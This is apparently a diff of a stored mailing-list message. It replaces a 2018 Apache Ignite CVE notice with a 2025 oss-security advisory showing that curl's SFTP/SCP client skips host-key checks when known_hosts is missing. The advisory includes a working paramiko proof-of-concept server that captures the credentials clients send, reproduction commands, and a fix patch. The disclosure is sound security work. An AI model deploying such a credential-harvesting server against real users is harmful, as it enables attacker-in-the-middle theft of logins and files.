@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["3771" "Wednesday" "26" "September" "2018" "22:56:04" "+0300" "Alexander Gerus" "agerus@gridgain.com" "<EBCD031F-3A4D-4A3F-9E3E-ACC7A6C6A624@gridgain.com>" "91" "[oss-security] Apache Ignite: CVE-2018-8018, CVE-2018-1273, CVE-2018-1274: Notification on available mitigation" nil nil nil "9" "2018092619:56:04" "[oss-security] Apache Ignite: CVE-2018-8018, CVE-2018-1273, CVE-2018-1274: Notification on available mitigation" (number mark "U       agerus@gridg Sep 26   91/3771  " thread-indent "\"[oss-security] Apache Ignite: CVE-2018-8018, CVE-2018-1273, CVE-2018-1274: Notification on available mitigation\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0000
-X-Mozilla-Status2: 00000000
-Received: (qmail 19586 invoked by uid 550); 26 Sep 2018 21:23:27 -0000
+Received: (qmail 5442 invoked by uid 550); 5 Feb 2025 16:10:10 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,131 +7,371 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 11481 invoked from network); 26 Sep 2018 19:56:17 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gridgain-com.20150623.gappssmtp.com; s=20150623;
-        h=from:mime-version:subject:message-id:date:to;
-        bh=TtX7eDqVI3ZhxGvVXcfd3XcIPAEBkCHu0g6v6Ye0Mns=;
-        b=bXHkJ8ocbE7RIuijf06jptR2vFpHEAZOK/Cf+Hx3aPI4sv9Cfm0CbNvjg2nN08oY6q
-         pGGPAaAFdF5e9UnKsQ7b/0E+o0G1eceEkBqWBzv5Y5ZJrcpHdORjoVP8It1KhKOCeVPu
-         Sn7chT0PK4GE+ju4qih/00FgDL9T4egEWlIyl8ZfhQnovnm6ucJT+TUPV9RZV2Zzpc4A
-         pH2egWnV8cJkkiUdEJA8PT2vattrSXJ9FGAYP13efHKHFZhCBYEv05A8fSH57CA96lHH
-         z5xPQm4mrm8zBz4jHXYxxMUSQQLmox/anQ6o7U4hi9xzylzIO2PVxYwGr9MCo3HO7ZPH
-         OEFg==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
-        h=x-gm-message-state:from:mime-version:subject:message-id:date:to;
-        bh=TtX7eDqVI3ZhxGvVXcfd3XcIPAEBkCHu0g6v6Ye0Mns=;
-        b=k61zOQv91l0B1fFjEQKfgBgQlZyjy/Ig/ORveVFfuKJXPWZJUgxGsAp9R+wyz8UGRf
-         9iP68WHF7oMODLSDVygBW9IFWXxMB3DWiNrfCs0Wf4tquQ8VLB/w/IKdZUULrcgIbJIy
-         PJoDpTUomYW2ZQVrYQloZrshdgroAD87bVaaP9+s3VKqzNzZ5yM4Y6JUAPcxBlCkP780
-         ugmJt/9qtu0EYQB37gRdpQtYNpjgoU6VrU7AYrCl/GX8bkan+uHNjcaVsuKUiH1SX5eP
-         e34aQ3o9Y+EmVmOmfMqEdQ43XJOI0hLyQ2QNXa1qbXpyFUQ9yt6NC3mgVL5Nh14MwjOc
-         VAMg==
-X-Gm-Message-State: ABuFfoibhfCnOqpCKzMOeH5ZAU5kxII/EiTWX6L03GYP1Iio/ta7BOA2
-	BKJQz57qEA644jY9IDGRfcRbmkOyVcE=
-X-Google-Smtp-Source: ACcGV61/quAG0B2V/rnYseOufqYytv+5cB/KaWUQfBexlzsY/7UJ4LWHmRvtHwqdCwSkzjf5xvrBXA==
-X-Received: by 2002:a19:e307:: with SMTP id a7-v6mr5127344lfh.125.1537991765749;
-        Wed, 26 Sep 2018 12:56:05 -0700 (PDT)
-From: Alexander Gerus <agerus@gridgain.com>
-Content-Type: multipart/alternative;
-	boundary="Apple-Mail=_E2649290-4263-4C3F-8012-17F3524FACE0"
-Mime-Version: 1.0 (Mac OS X Mail 11.5 \(3445.9.1\))
-Message-Id: <EBCD031F-3A4D-4A3F-9E3E-ACC7A6C6A624@gridgain.com>
-Date: Wed, 26 Sep 2018 22:56:04 +0300
+x-ms-reactions: disallow
+Received: (qmail 7436 invoked from network); 5 Feb 2025 15:08:43 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=iki.fi; s=lahtoruutu;
+	t=1738768112;
+	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
+	 to:to:cc:mime-version:mime-version:content-type:content-type;
+	bh=xshj7LJdPylqQL4MEhhVddys7DEaRfvAv9HtbgTO5e0=;
+	b=WvkCmdF36ICqCOv8ijgetEJ+X4MFbZCX4EzTgOx6Zt1kCRYVA729vsu87bq2IomIXtl/2R
+	9HvEgmgxUPKL5sRHP0dR4Zvs8V+VYD1bLJJ+W7cRNsV2lI6UfgPb3uhIPuEfNTBrTH4QMW
+	2pdhsQkLqgqS2SxsZIV+u/Ot1ylJagSFEXfB/YV2Kp/pqYAidXnJgN37ZrObui4RBKTNHd
+	orY8ZaJYbHqGb/yF4b1JbDivwBFkypGbBlFi2/ZAtZnfveUk3vrJiOpBd5KSz1gHB5lhUZ
+	fjpjWl++fsTpfiY95SnEYVZJIL518dHSyxUnDbC9DvHL7aEi/A+HYV2Kn88x2Q==
+ARC-Seal: i=1; s=lahtoruutu; d=iki.fi; t=1738768112; a=rsa-sha256;
+	cv=none;
+	b=N/fsOLKWQ9cA6LDDNnTiL7zEohreZs19BWDVJswk8kLGDr/xyKiiSMnN3yD3IOdoWyyTsL
+	uOog8hNUp5stl0d2MWkLjzHpMXon7QJaViRRYdHPlB9uOQ0TXsjL2dvN+YLItmzNP7kc8q
+	OL3yt1xpgnJrWkhz54xqJrJCNUeGIEOCPPxwvpmE9rWpYFpe+jnMlXB3pV1JRlgMdPhbUk
+	NfEKM9i56ipQctyZApLSRI5JVifYL028obdwREOhzQRhGcKlHVsS5gnXRYsJKAiUv17Itg
+	27Jsxu/W4BfrNHS7DGSyXsjZZriePmVGnypTgYSiHwswLOmj4noVoxY35KJErw==
+ARC-Authentication-Results: i=1;
+	ORIGINATING;
+	auth=pass smtp.auth=sintonen smtp.mailfrom=sintonen@iki.fi
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=iki.fi;
+	s=lahtoruutu; t=1738768112;
+	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
+	 to:to:cc:mime-version:mime-version:content-type:content-type;
+	bh=xshj7LJdPylqQL4MEhhVddys7DEaRfvAv9HtbgTO5e0=;
+	b=UmJnM/6+fHSSEMJnXPGhMUoEPOcXTcw0FhoLoUOGMjGeOyEe+0MaJhaWZPP5BRtgSvvho7
+	Wqpx3wTG2cV9gUtXeqAPQ3o4rBIH8Kdezw+eUKi+uudhTUcWnxmqDntDy9tHgTySbtJkOw
+	8WhERPW/nl2VFraJhIG4z8OGyCS/OaaqjU3l214NHe7YTQMd9j5IPsgQFa0nse17Rhh1IM
+	8GmL5Wl7UQinPu+g4GBjC9vtR0RP6obED96Awk2dttT0Y/bML4AM09UfG9O2+QuMuSVbOC
+	D85Ns19K2a2oVcfFvojwUCVcrIqBekdyORDyTHZJ05daWjCgQEGwYR3yR74vRA==
+Date: Wed, 5 Feb 2025 17:08:31 +0200 (EET)
+From: Harry Sintonen <sintonen@iki.fi>
 To: oss-security@lists.openwall.com
-X-Mailer: Apple Mail (2.3445.9.1)
-Subject: [oss-security] Apache Ignite: CVE-2018-8018, CVE-2018-1273, CVE-2018-1274:
- Notification on available mitigation
+Message-ID: <8685f39b-c4cb-2a11-82cb-74ed44432947@iki.fi>
+MIME-Version: 1.0
+Content-Type: text/plain; format=flowed; charset=US-ASCII
+Subject: [oss-security] Curl SSH Insufficient Host Identity Verification
 
---Apple-Mail=_E2649290-4263-4C3F-8012-17F3524FACE0
-Content-Transfer-Encoding: quoted-printable
-Content-Type: text/plain;
-	charset=utf-8
+Curl SSH Insufficient Host Identity Verification
+================================================
+The latest version of this advisory is available at:
+https://sintonen.fi/advisories/curl-ssh-insufficient-host-identity-verification.txt
 
-[CVE-2018-8018] Possible Execution of Arbitrary Code via Apache Ignite Grid=
-ClientJdkMarshaller
-Severity: Important
-Vendor: GridGain Systems
-Versions Affected:
-GridGain Professional Edition 2.4.7 or earlier
-GridGain Ultimate and Enterprise Editions 8.4.7 or earlier
-Impact:
-An attacker can execute arbitrary code on Ignite nodes via GridClientJdkMar=
-shaller deserialization endpoint in the case when Ignite classpath contains=
- arbitrary vulnerable classes.=20
-
-Description:
-Apache Ignite serialization mechanism does not have a list of classes allow=
-ed for serialization/deserialization, which makes it possible to run arbitr=
-ary code when 3-rd party vulnerable classes are present in Ignite classpath=
-. The vulnerability can be exploited if the one sends a specially prepared =
-form of a serialized object to GridClientJdkMarshaller deserialization endp=
-oint.=20
-
-Mitigation:
-All GridGain versions: make sure there are no vulnerable classes among your=
- custom code used in GridGain.=20
-Ignite Professional Edition 2.4.7 or earlier users: upgrade to Ignite 2.4.8=
- or later version
-Ignite Ultimate and Enterprise Editions 8.4.7 or earlier users: upgrade to =
-Ignite 8.4.8 or later version
-After version upgrade use IGNITE_MARSHALLER_WHITELIST and/or IGNITE_MARSHAL=
-LER_BLACKLIST system properties to define classes allowed for deserializati=
-on. Refer to documentation for more details:=20
-https://apacheignite.readme.io/docs/securing-data-deserialization <https://=
-apacheignite.readme.io/docs/securing-data-deserialization>
-Credit:
-The vulnerability was discovered by Man Yue Mo of lgtm.com
-Reference:
-http://cve.mitre.org/cgi-bin/cvename.cgi?name=3DCVE-2018-8018 <http://cve.m=
-itre.org/cgi-bin/cvename.cgi?name=3DCVE-2018-8018>
-
-[CVE-2018-1273] [CVE-2018-1274] Apache Ignite impacted by security vulnerab=
-ility in Spring Data Commons
-Severity: Important
-Vendor: GridGain Systems
-Versions Affected:
-GridGain Professional Edition 2.4.7 or earlier
-GridGain Ultimate and Enterprise Editions 8.4.7 or earlier
-
-Impact:
-	An unauthenticated remote malicious user (or attacker) can issue requests =
-against Spring Data REST or Spring Data=20
-
-Description:
-	Apache Ignite utilizes Spring Data Common library for some of its componen=
-ts. The vulnerability affects Apache Ignite users who us Spring Data REST f=
-or access an Ignite cluster via HTTP and Spring Data. Spring Data Commons, =
-versions prior to 1.13 to 1.13.10, 2.0 to 2.0.5, and older unsupported vers=
-ions, contain a property binder vulnerability caused by improper neutraliza=
-tion of special elements. An unauthenticated remote malicious user (or atta=
-cker) can supply specially crafted request parameters against=20
-	Spring Data REST backed HTTP resources or using Spring Data=E2=80=99s proj=
-ection-based request payload binding hat can lead to a remote code executio=
-n attack.
-
-Mitigation:
-Ignite Professional Edition 2.4.7 or earlier users: upgrade to Ignite 2.4.8=
- or later version
-Ignite Ultimate and Enterprise Editions 8.4.7 or earlier users: upgrade to =
-Ignite 8.4.8 or later version
-Credit:
-Harendra Rai of NCR Corporation discovered the impact of the existing vulne=
-rability on Apache Ignite.=20
-Reference:
-https://cve.mitre.org/cgi-bin/cvename.cgi?name=3DCVE-2018-1273 <https://cve=
-.mitre.org/cgi-bin/cvename.cgi?name=3DCVE-2018-1273>
-https://cve.mitre.org/cgi-bin/cvename.cgi?name=3DCVE-2018-1274 <https://cve=
-.mitre.org/cgi-bin/cvename.cgi?name=3DCVE-2018-1274>
-
---
-Alexander Gerus, On behalf of GridGain team.
-E agerus@gridgain.com
-gridgain.com
-Powered by Apache=C2=AE Ignite=E2=84=A2
+Product:  curl up to and including version 8.12.0
+Severity: High if important curl SSH transfers are affected. However, most end users
+           are not affected. Assess the risk & impact on individual system basis.
+Type:     Improper Host Identity Validation
+CVE:      Not assigned (Not considered a vulnerability by the CNA)
 
 
+Description
+-----------
+
+Curl can perform SFTP and SCP connections to download from or upload to SSH server. As
+part of this SSH connection curl validates the host identity against the database of
+known hosts (.ssh/known_hosts).
+
+The curl man page about "--insecure" option says:
+
+               (TLS SFTP SCP) By default, every secure connection curl makes is
+               verified to be secure before the transfer takes place. This option
+               makes curl skip the verification step and proceed without checking.
+
+               ...
+
+               For SFTP and SCP, this option makes curl skip the known_hosts
+               verification. known_hosts is a file normally stored in the
+               user's home directory in the ".ssh" subdirectory, which contains
+               hostnames and their public keys.
+
+               WARNING: using this option makes the transfer insecure.
+
+This documentation implies that by default (if --insecure option is not present),
+known_hosts verification will be performed, and the transfer is secure. However, due to a
+logic flaw, curl omits this validation if the .ssh/known_hosts file is missing entirely.
+
+When the file is missing curl connection to an SSH host system is vulnerable to attacker
+in the middle attacks. When using key based authentication, it allows a malicious host to
+spoof the target host, and either return tampered or otherwise malicious content on
+download, or for uploads for the attacker to capture the uploads. When using password
+authentication it will also leak the username and password to the attacker, and thus
+allows the attacker to connect to the intended target host with the leaked credentials.
+
+The ssh/.known_hosts file generally is missing for accounts that have not used ssh
+commands before. For interactive user accounts this can be considered rare. The
+situation can happen more often for technical accounts set up for applications or
+automated processing. It can also easily happen when curl is deployed via docker. For
+example using dockerized curl like this is vulnerable:
+
+$ docker run --rm curlimages/curl:8.11.1 -u bob:hunter2 sftp://target.invalid/file
+
+The attack can be performed at any network position between the curl client and the
+target SSH server. Typical low effort attack scenario would involve running a rogue
+access point that performs the attack. More advanced exploitation is possible by actors
+with privileged access to networking equipment.
+
+It should be noted that curl project itself doesn't consider this issue a security
+vulnerability. The project argues that the "Warning: Couldn't find a known_hosts file"
+message shown should be enough to alert the user to the issue. Additionally, the project
+argues that the documentation does not explicitly state that the operation would be
+safe if the known_hosts file is missing. The argument also is that the user should
+understand that the connection would be insecure under these circumstances. Finally,
+the project also mentions that this is the way curl has worked for a long time. Curl
+project also notes that this an area/behavior that could be improved in curl.
+
+My remarks on these arguments are:
+
+1. The warning message is enough to warn the users
+
+    There might not be human reading the warning message if curl is used in
+    automation. Even if there is, this assumes that user understands that despite
+    the message the user credentials have already been leaked, the download might
+    have been replaced with malicious content, or the upload sent to an attacker
+    controlled system. The message is also often hidden among a lot of other
+    information presented (such as the progress bar), so it's rather easy to miss.
+
+2. Documentation doesn't claim curl being secure in this condition
+
+    This is true, but the documentation of --insecure option explicitly says that:
+    "(TLS SFTP SCP) By default, every secure connection curl makes is verified
+     to be secure before the transfer takes place."
+    This statement is quite explicit in claiming that every TLS, SFTP, SCP connection
+    is secure by default, unless if curl is told to be insecure. While the statement
+    "There is no documentation claiming the opposite" is true, I argue that users
+    can understand the documentation in a way that curl would be secure even if the
+    known_hosts file is missing.
+
+3. Users should understand curl being insecure in this condition
+
+    Experienced users might understand that something is off if they spot the
+    warning message. However, this assumes quite intimate understanding of SSH
+    protocol and host key validation. In my experience this is not capability many
+    inexperienced users have. Finally, all other SSH tools (including OpenSSH) by
+    default will consider missing known_hosts file same as "the host is not
+    known".
+
+4. Curl has worked like this for a long time
+
+    Generally, curl project doesn't want to change behavior on a whim, and I agree
+    with this in most situations. Even a small behavioral change can lead to
+    countless of automated tasks suddenly failing. If this long-standing behavior
+    wouldn't lead to security impact this argument would be much stronger. Here I
+    believe that curl should rather outright fail if the known_hosts file is missing.
+    This would be a behavioral change, and it would break some existing workflows.
+    But the affected workflows are vulnerable to Attacker in the Middle attacks, so
+    I believe this is acceptable.
+
+I respect the curl project and the team and applaud their excellent security work.
+However, I can't agree with them about this issue not being a vulnerability. The full
+discussion about this can be read from the following Hackerone ticket:
+https://hackerone.com/reports/2961050
 
 
---Apple-Mail=_E2649290-4263-4C3F-8012-17F3524FACE0--
+Details
+-------
+
+Secure Shell (SSH) protocol depends on validation of trust. It is not merely enough to
+encrypt the communication towards a server, the client also must confirm the identity of
+the peer. The authentication aspect of SSH requires that the client has prior knowledge
+of the cryptographic identity of the target server. The SSH client must verify the
+authenticity of the server to ensure secure communication.
+
+
+CWE-295: Improper Host Certificate Validation
+---------------------------------------------
+
+The curl application SSH server host certificate validation is insufficient. Since the
+authenticity check is omitted if the .ssh/known_hosts file is missing, a third party in
+privileged network position can tamper with the communication between the client and the
+server. As a result, an attacker in a privileged network position (any point between the
+curl application and the SSH server) can perform an Attacker in The Middle attack.
+
+This flaw is a result of a logic flaw in curl code at src/tool_operate.c:
+
+     if(!config->insecure_ok) {
+       char *known = findfile(".ssh/known_hosts", FALSE);
+       if(known) {
+         /* new in curl 7.19.6 */
+         result = res_setopt_str(curl, CURLOPT_SSH_KNOWNHOSTS, known);
+         curl_free(known);
+         if(result == CURLE_UNKNOWN_OPTION)
+           /* libssh2 version older than 1.1.1 */
+           result = CURLE_OK;
+         if(result)
+           return result;
+       }
+       else
+         warnf(global, "Couldn't find a known_hosts file");
+     }
+   }
+
+When findfile() function cannot find the ".ssh/known_hosts" in any of the search paths,
+the code will result in not setting CURLOPT_SSH_KNOWNHOSTS at all. This, in turn, will
+result in libcurl to omit validating the host identity.
+
+As a result, curl will connect to any server, regardless of its identity.
+
+Notably, even though curl does print "Warning: Couldn't find a known_hosts file" to
+standard error when the attack is successful, it prints this right before connecting the
+host. At that point it is too late, and typically the user doesn't have time to react to
+the warning. The confidential information (such as credentials and file on upload
+operations) have already been sent to the unverified host.
+
+
+Proof of Concept 
+----------------
+
+I developed a minimal proof of concept SSH server that demonstrates the issue by capturing
+the user credentials passed in curl invocation. This proof of concept does not enable file
+transfers, nor does it itself perform any attacker in the middle functionality.
+
+1. Run a malicious SSH server:
+
+#!/usr/bin/env python3
+
+import paramiko.rsakey
+import paramiko
+import threading
+import logging
+import socket
+
+logging.basicConfig(level = logging.INFO)
+
+class SSHServer(paramiko.ServerInterface):
+     def __init__(self):
+         self.event = threading.Event()
+
+     def get_allowed_auths(self, username):
+         logging.debug('[auth] Get username {} allowed auths'.format(username))
+         return "password,publickey,none"
+
+     def check_auth_none(self, username):
+         logging.debug('[none] Authenticated username {}'.format(username))
+         return paramiko.AUTH_FAILED
+
+     def check_auth_password(self, username, password):
+         logging.info('[pass] Authenticated username {} password {}'.format(username, password))
+         return paramiko.AUTH_FAILED
+
+class ClientConnection(threading.Thread):
+     def __init__(self, group = None, target = None, name = None, args = ()):
+         threading.Thread.__init__(self, group = group, target = target, name = name)
+         self.args = args
+
+     def run(self):
+         hostkey = self.args[0]
+         client = self.args[1]
+         transport = None
+         chan = None
+
+         try:
+             transport = paramiko.Transport(client)
+             try:
+                 transport.load_server_moduli()
+             except:
+                 pass
+
+             transport.add_server_key(hostkey)
+             server = SSHServer()
+             try:
+                 transport.start_server(server=server)
+             except:
+                 logging.warning('*** SSH negotiation failed, disconnect')
+                 client.close()
+                 return
+
+             logging.info('Full remote version: {}'.format(transport.remote_version))
+
+             chan = transport.accept(10)
+             if chan:
+                 chan.close()
+             transport.close()
+
+         except Exception as e:
+             logging.info('*** Caught exception: {}: {}'.format(str(e.__class__), str(e)))
+             if chan:
+                 chan.close()
+             if transport:
+                 transport.close()
+             pass
+
+
+def main():
+     hostkey = paramiko.rsakey.RSAKey.generate(1024)
+     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+     sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+     sock.bind(('127.0.0.1', 2222))
+     sock.listen(7)
+
+     while True:
+         client, addr = sock.accept()
+         logging.info('Received connection from {}:{}'.format(addr[0], addr[1]))
+         t = ClientConnection(args = (hostkey, client,))
+         t.start()
+
+if __name__ == '__main__':
+     main()
+
+2. Connect to the malicious SSH server without a known_hosts file:
+   $ mv ~/.ssh/known_hosts ~/.ssh/known_hosts.backup
+   $ curl -u bob:hunter2 sftp://localhost:2222
+
+3. The malicious SSH server dumps the credentials:
+   ...
+   INFO:root:[pass] Authenticated username bob password hunter2
+   ...
+
+
+Mitigations
+-----------
+
+1. You can apply the following patch to fix the issue:
+
+---8<---
+diff --git a/src/tool_operate.c b/src/tool_operate.c
+index 007a5e054..52e10a5f5 100644
+--- a/src/tool_operate.c
++++ b/src/tool_operate.c
+@@ -1170,14 +1170,13 @@ static CURLcode config2setopts(struct GlobalConfig *global,
+          /* new in curl 7.19.6 */
+          result = res_setopt_str(curl, CURLOPT_SSH_KNOWNHOSTS, known);
+          curl_free(known);
+-        if(result == CURLE_UNKNOWN_OPTION)
+-          /* libssh2 version older than 1.1.1 */
+-          result = CURLE_OK;
+-        if(result)
+-          return result;
+        }
+-      else
++      else {
+          warnf(global, "Couldn't find a known_hosts file");
++        result = res_setopt_str(curl, CURLOPT_SSH_KNOWNHOSTS, "");
++      }
++      if(result)
++        return result;
+      }
+    }
+
+---8<---
+
+With this modification curl command will delegate the validation to the whichever SSH
+backend that has been compiled to curl. Empty filename cannot be opened and will result
+in the host identity not considered valid. This patch also changes the behaviour if the
+SSH backend doesn't understand CURLE_UNKNOWN_OPTION option: This is now considered a
+fatal error.
+
+Note that this patch likely won't apply as-is to all curl versions. However, the
+change should be trivial to backport to other curl releases, too.
+
+
+2. If you cannot change curl or build your own, there are strategies that will prevent
+this vulnerability from getting triggered:
+
+- Ensure that the .ssh/known_hosts file exist (either preseeded with the
+   out-of-band validated host identities, or if there are none, have an empty
+   file).
+or
+- Employ --hostpubmd5 or --hostpubsha256 option to validate the host identity.
+
+
+Timeline 
+--------
+
+2025-01-27  Discovered and reported the vulnerability via curl Hackerone program.
+2025-01-27  Report declared "not security vulnerability".
+2025-02-05  Released this advisory.
